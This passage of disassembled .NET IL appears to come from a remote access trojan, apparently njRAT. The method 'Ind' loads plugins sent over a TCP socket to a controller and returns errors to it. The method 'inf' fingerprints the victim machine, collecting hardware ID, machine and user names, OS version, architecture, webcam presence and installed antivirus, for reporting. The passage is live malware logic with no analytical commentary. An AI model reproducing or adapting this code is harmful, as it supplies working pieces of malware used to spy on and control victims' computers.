      IL_24d2:  call       void j.OK::UNS()
      IL_24d7:  leave      IL_2724

      IL_24dc:  ldloc.2
      IL_24dd:  ldstr      "Ex"
      IL_24e2:  ldc.i4.0
      IL_24e3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_24e8:  brtrue     IL_25ad

      IL_24ed:  ldsfld     object j.OK::PLG
      IL_24f2:  brtrue.s   IL_2546

      IL_24f4:  ldstr      "PLG"
      IL_24f9:  call       bool j.OK::Send(string)
      IL_24fe:  pop
      IL_24ff:  ldc.i4.0
      IL_2500:  stloc.s    V_172
      IL_2502:  br.s       IL_2514

      IL_2504:  ldloc.s    V_172
      IL_2506:  ldc.i4.1
      IL_2507:  add.ovf
      IL_2508:  stloc.s    V_172
      IL_250a:  ldc.i4     0x3e8
      IL_250f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_2514:  ldsfld     object j.OK::PLG
      IL_2519:  ldnull
      IL_251a:  cgt.un
      IL_251c:  ldloc.s    V_172
      IL_251e:  ldc.i4.s   20
      IL_2520:  ceq
      IL_2522:  or
      IL_2523:  ldsfld     bool j.OK::Cn
      IL_2528:  ldc.i4.0
      IL_2529:  ceq
      IL_252b:  or
      IL_252c:  brfalse.s  IL_2504

      IL_252e:  ldsfld     object j.OK::PLG
      IL_2533:  ldnull
      IL_2534:  ceq
      IL_2536:  ldsfld     bool j.OK::Cn
      IL_253b:  ldc.i4.0
      IL_253c:  ceq
      IL_253e:  or
      IL_253f:  brfalse.s  IL_2546

      IL_2541:  leave      IL_2724

      IL_2546:  ldc.i4.1
      IL_2547:  newarr     [mscorlib]System.Object
      IL_254c:  dup
      IL_254d:  ldc.i4.0
      IL_254e:  ldarg.0
      IL_254f:  stelem.ref
      IL_2550:  stloc.s    V_170
      IL_2552:  ldc.i4.1
      IL_2553:  newarr     [mscorlib]System.Boolean
      IL_2558:  dup
      IL_2559:  ldc.i4.0
      IL_255a:  ldc.i4.1
      IL_255b:  stelem.i1
      IL_255c:  stloc.s    V_171
      IL_255e:  ldsfld     object j.OK::PLG
      IL_2563:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2568:  ldnull
      IL_2569:  ldstr      "ind"
      IL_256e:  ldloc.s    V_170
      IL_2570:  ldnull
      IL_2571:  ldnull
      IL_2572:  ldloc.s    V_171
      IL_2574:  ldc.i4.1
      IL_2575:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_257a:  pop
      IL_257b:  ldloc.s    V_171
      IL_257d:  ldc.i4.0
      IL_257e:  ldelem.u1
      IL_257f:  brfalse    IL_2678

      IL_2584:  ldloc.s    V_170
      IL_2586:  ldc.i4.0
      IL_2587:  ldelem.ref
      IL_2588:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_258d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2592:  ldtoken    uint8[]
      IL_2597:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_259c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_25a1:  castclass  uint8[]
      IL_25a6:  starg.s    b
      IL_25a8:  br         IL_2678

      IL_25ad:  ldloc.2
      IL_25ae:  ldstr      "PLG"
      IL_25b3:  ldc.i4.0
      IL_25b4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_25b9:  brtrue     IL_2678

      IL_25be:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_25c3:  ldloc.0
      IL_25c4:  ldc.i4.0
      IL_25c5:  ldelem.ref
      IL_25c6:  ldsfld     string j.OK::Y
      IL_25cb:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_25d0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_25d5:  stloc.s    V_173
      IL_25d7:  dup
      IL_25d8:  ldarg.0
      IL_25d9:  ldloc.s    V_173
      IL_25db:  ldarg.0
      IL_25dc:  ldlen
      IL_25dd:  conv.i4
      IL_25de:  ldloc.s    V_173
      IL_25e0:  sub.ovf
      IL_25e1:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_25e6:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_25eb:  call       uint8[] j.OK::ZIP(uint8[])
      IL_25f0:  ldstr      "A"
      IL_25f5:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_25fa:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_25ff:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2604:  stsfld     object j.OK::PLG
      IL_2609:  ldsfld     object j.OK::PLG
      IL_260e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2613:  ldnull
      IL_2614:  ldstr      "H"
      IL_2619:  ldc.i4.1
      IL_261a:  newarr     [mscorlib]System.Object
      IL_261f:  dup
      IL_2620:  ldc.i4.0
      IL_2621:  ldsfld     string j.OK::H
      IL_2626:  stelem.ref
      IL_2627:  ldnull
      IL_2628:  ldnull
      IL_2629:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_262e:  ldsfld     object j.OK::PLG
      IL_2633:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2638:  ldnull
      IL_2639:  ldstr      "P"
      IL_263e:  ldc.i4.1
      IL_263f:  newarr     [mscorlib]System.Object
      IL_2644:  dup
      IL_2645:  ldc.i4.0
      IL_2646:  ldsfld     string j.OK::P
      IL_264b:  stelem.ref
      IL_264c:  ldnull
      IL_264d:  ldnull
      IL_264e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_2653:  ldsfld     object j.OK::PLG
      IL_2658:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_265d:  ldnull
      IL_265e:  ldstr      "c"
      IL_2663:  ldc.i4.1
      IL_2664:  newarr     [mscorlib]System.Object
      IL_2669:  dup
      IL_266a:  ldc.i4.0
      IL_266b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_2670:  stelem.ref
      IL_2671:  ldnull
      IL_2672:  ldnull
      IL_2673:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_2678:  leave      IL_2724

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_267d:  dup
      IL_267e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_2683:  stloc.s    V_174
      IL_2685:  ldloc.s    V_174
      IL_2687:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_268c:  ldloc.s    V_174
      IL_268e:  stloc.s    V_175
      IL_2690:  ldloc.0
      IL_2691:  ldlen
      IL_2692:  conv.i4
      IL_2693:  ldc.i4.0
      IL_2694:  ble.s      IL_26c1

      IL_2696:  ldloc.0
      IL_2697:  ldc.i4.0
      IL_2698:  ldelem.ref
      IL_2699:  ldstr      "Ex"
      IL_269e:  ldc.i4.0
      IL_269f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_26a4:  ldc.i4.0
      IL_26a5:  ceq
      IL_26a7:  ldloc.0
      IL_26a8:  ldc.i4.0
      IL_26a9:  ldelem.ref
      IL_26aa:  ldstr      "PLG"
      IL_26af:  ldc.i4.0
      IL_26b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_26b5:  ldc.i4.0
      IL_26b6:  ceq
      IL_26b8:  or
      IL_26b9:  brfalse.s  IL_26c1

      IL_26bb:  ldnull
      IL_26bc:  stsfld     object j.OK::PLG
      IL_26c1:  nop
      .try
      {
        IL_26c2:  ldc.i4.5
        IL_26c3:  newarr     [mscorlib]System.String
        IL_26c8:  dup
        IL_26c9:  ldc.i4.0
        IL_26ca:  ldstr      "ER"
        IL_26cf:  stelem.ref
        IL_26d0:  dup
        IL_26d1:  ldc.i4.1
        IL_26d2:  ldsfld     string j.OK::Y
        IL_26d7:  stelem.ref
        IL_26d8:  dup
        IL_26d9:  ldc.i4.2
        IL_26da:  ldloc.0
        IL_26db:  ldc.i4.0
        IL_26dc:  ldelem.ref
        IL_26dd:  stelem.ref
        IL_26de:  dup
        IL_26df:  ldc.i4.3
        IL_26e0:  ldsfld     string j.OK::Y
        IL_26e5:  stelem.ref
        IL_26e6:  dup
        IL_26e7:  ldc.i4.4
        IL_26e8:  ldloc.s    V_175
        IL_26ea:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_26ef:  stelem.ref
        IL_26f0:  call       string [mscorlib]System.String::Concat(string[])
        IL_26f5:  call       bool j.OK::Send(string)
        IL_26fa:  pop
        IL_26fb:  leave.s    IL_2718

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_26fd:  dup
        IL_26fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2703:  stloc.s    V_176
        IL_2705:  ldloc.s    V_176
        IL_2707:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_270c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2711:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2716:  leave.s    IL_2718

      }  // end handler
      IL_2718:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_271d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_2722:  leave.s    IL_2724

    }  // end handler
    IL_2724:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1056 (0x420)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [mscorlib]System.DateTime V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string[] V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string[] V_14,
             int32 V_15,
             class [mscorlib]System.Exception V_16)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                            object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0060

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string j.OK::VN
      IL_0037:  call       string j.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  call       string j.OK::HWD()
      IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004b:  stloc.2
      IL_004c:  ldloca.s   V_2
      IL_004e:  call       string j.OK::ENB(string&)
      IL_0053:  ldsfld     string j.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.0
      IL_005e:  br.s       IL_00a4

      IL_0060:  ldloc.0
      IL_0061:  ldstr      "vn"
      IL_0066:  ldstr      ""
      IL_006b:  call       object j.OK::GTV(string,
                                            object)
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007a:  stloc.3
      IL_007b:  ldloca.s   V_3
      IL_007d:  call       string j.OK::DEB(string&)
      IL_0082:  ldstr      "_"
      IL_0087:  call       string j.OK::HWD()
      IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0091:  stloc.2
      IL_0092:  ldloca.s   V_2
      IL_0094:  call       string j.OK::ENB(string&)
      IL_0099:  ldsfld     string j.OK::Y
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a3:  stloc.0
      IL_00a4:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a6:  dup
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  stloc.s    V_4
      IL_00ae:  ldloc.s    V_4
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  ldloc.0
      IL_00b6:  call       string j.OK::HWD()
      IL_00bb:  stloc.2
      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       string j.OK::ENB(string&)
      IL_00c3:  ldsfld     string j.OK::Y
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  stloc.0
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    .try
    {
      IL_00db:  ldloc.0
      IL_00dc:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  stloc.0
      IL_00ec:  leave.s    IL_011a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ee:  dup
      IL_00ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f4:  stloc.s    V_5
      IL_00f6:  ldloc.s    V_5
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  ldloc.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  ldsfld     string j.OK::Y
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  stloc.0
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0118:  leave.s    IL_011a

    }  // end handler
    IL_011a:  nop
    .try
    {
      IL_011b:  ldloc.0
      IL_011c:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0121:  ldsfld     string j.OK::Y
      IL_0126:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012b:  stloc.0
      IL_012c:  leave.s    IL_015a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012e:  dup
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0134:  stloc.s    V_6
      IL_0136:  ldloc.s    V_6
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013d:  ldloc.0
      IL_013e:  ldstr      "\?\?"
      IL_0143:  ldsfld     string j.OK::Y
      IL_0148:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014d:  stloc.0
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0158:  leave.s    IL_015a

    }  // end handler
    IL_015a:  nop
    .try
    {
      IL_015b:  ldloc.0
      IL_015c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0161:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0166:  stloc.s    V_7
      IL_0168:  ldloca.s   V_7
      IL_016a:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_016f:  stloc.s    V_7
      IL_0171:  ldloca.s   V_7
      IL_0173:  ldstr      "yy-MM-dd"
      IL_0178:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_017d:  ldsfld     string j.OK::Y
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  stloc.0
      IL_0188:  leave.s    IL_01b6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_8
      IL_0192:  ldloc.s    V_8
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  ldloc.0
      IL_019a:  ldstr      "\?\?-\?\?-\?\?"
      IL_019f:  ldsfld     string j.OK::Y
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b4:  leave.s    IL_01b6

    }  // end handler
    IL_01b6:  ldloc.0
    IL_01b7:  ldsfld     string j.OK::Y
    IL_01bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c1:  stloc.0
    .try
    {
      IL_01c2:  ldloc.0
      IL_01c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01cd:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01d2:  ldstr      "Microsoft"
      IL_01d7:  ldstr      ""
      IL_01dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e1:  ldstr      "Windows"
      IL_01e6:  ldstr      "Win"
      IL_01eb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f0:  ldstr      bytearray (AE 00 ) 
      IL_01f5:  ldstr      ""
      IL_01fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ff:  ldstr      bytearray (22 21 )                                           // "!
      IL_0204:  ldstr      ""
      IL_0209:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020e:  ldstr      "  "
      IL_0213:  ldstr      " "
      IL_0218:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021d:  ldstr      " Win"
      IL_0222:  ldstr      "Win"
      IL_0227:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.0
      IL_0232:  leave.s    IL_025b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0234:  dup
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023a:  stloc.s    V_9
      IL_023c:  ldloc.s    V_9
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0243:  ldloc.0
      IL_0244:  ldstr      "\?\?"
      IL_0249:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024e:  stloc.0
      IL_024f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0259:  leave.s    IL_025b

    }  // end handler
    IL_025b:  ldloc.0
    IL_025c:  ldstr      "SP"
    IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0266:  stloc.0
    .try
    {
      IL_0267:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0271:  ldstr      " "
      IL_0276:  ldc.i4.m1
      IL_0277:  ldc.i4.0
      IL_0278:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027d:  stloc.s    V_10
      IL_027f:  ldloc.s    V_10
      IL_0281:  ldlen
      IL_0282:  conv.i4
      IL_0283:  ldc.i4.1
      IL_0284:  bne.un.s   IL_0292

      IL_0286:  ldloc.0
      IL_0287:  ldstr      "0"
      IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0291:  stloc.0
      IL_0292:  ldloc.0
      IL_0293:  ldloc.s    V_10
      IL_0295:  ldloc.s    V_10
      IL_0297:  ldlen
      IL_0298:  conv.i4
      IL_0299:  ldc.i4.1
      IL_029a:  sub.ovf
      IL_029b:  ldelem.ref
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a1:  stloc.0
      IL_02a2:  leave.s    IL_02cb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a4:  dup
      IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02aa:  stloc.s    V_11
      IL_02ac:  ldloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  ldloc.0
      IL_02b4:  ldstr      "0"
      IL_02b9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02be:  stloc.0
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c9:  leave.s    IL_02cb

    }  // end handler
    IL_02cb:  nop
    .try
    {
      IL_02cc:  ldc.i4.s   38
      IL_02ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d3:  ldstr      "x86"
      IL_02d8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.0
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string j.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.0
      IL_02f0:  br.s       IL_0303

      IL_02f2:  ldloc.0
      IL_02f3:  ldstr      " x86"
      IL_02f8:  ldsfld     string j.OK::Y
      IL_02fd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0302:  stloc.0
      IL_0303:  leave.s    IL_032c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0305:  dup
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030b:  stloc.s    V_12
      IL_030d:  ldloc.s    V_12
      IL_030f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0314:  ldloc.0
      IL_0315:  ldsfld     string j.OK::Y
      IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_031f:  stloc.0
      IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032a:  leave.s    IL_032c

    }  // end handler
    IL_032c:  call       bool j.OK::Cam()
    IL_0331:  brfalse.s  IL_0346

    IL_0333:  ldloc.0
    IL_0334:  ldstr      "Yes"
    IL_0339:  ldsfld     string j.OK::Y
    IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0343:  stloc.0
    IL_0344:  br.s       IL_0357

    IL_0346:  ldloc.0
    IL_0347:  ldstr      "No"
    IL_034c:  ldsfld     string j.OK::Y
    IL_0351:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0356:  stloc.0
    IL_0357:  ldc.i4.7
    IL_0358:  newarr     [mscorlib]System.String
    IL_035d:  dup
    IL_035e:  ldc.i4.0
    IL_035f:  ldloc.0
    IL_0360:  stelem.ref
    IL_0361:  dup
    IL_0362:  ldc.i4.1
    IL_0363:  call       string j.OK::GetAntiVirus()
    IL_0368:  stelem.ref
    IL_0369:  dup
    IL_036a:  ldc.i4.2
    IL_036b:  ldsfld     string j.OK::Y
    IL_0370:  stelem.ref
    IL_0371:  dup
    IL_0372:  ldc.i4.3
    IL_0373:  call       string j.OK::GetAntiVirus()
    IL_0378:  stelem.ref
    IL_0379:  dup
    IL_037a:  ldc.i4.4
    IL_037b:  ldsfld     string j.OK::Y
    IL_0380:  stelem.ref
    IL_0381:  dup
    IL_0382:  ldc.i4.5
    IL_0383:  call       string j.OK::GetAntiVirus()
    IL_0388:  stelem.ref
    IL_0389:  dup
    IL_038a:  ldc.i4.6
    IL_038b:  ldsfld     string j.OK::Y
    IL_0390:  stelem.ref
    IL_0391:  call       string [mscorlib]System.String::Concat(string[])
    IL_0396:  stloc.0
    IL_0397:  ldstr      ""
    IL_039c:  stloc.1
    .try
    {
      IL_039d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03a2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03ac:  ldstr      "Software\\"
      IL_03b1:  ldsfld     string j.OK::RG
      IL_03b6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bb:  ldc.i4.0
      IL_03bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03c1:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c6:  stloc.s    V_14
      IL_03c8:  ldc.i4.0
      IL_03c9:  stloc.s    V_15
      IL_03cb:  br.s       IL_03f3

      IL_03cd:  ldloc.s    V_14
      IL_03cf:  ldloc.s    V_15
      IL_03d1:  ldelem.ref
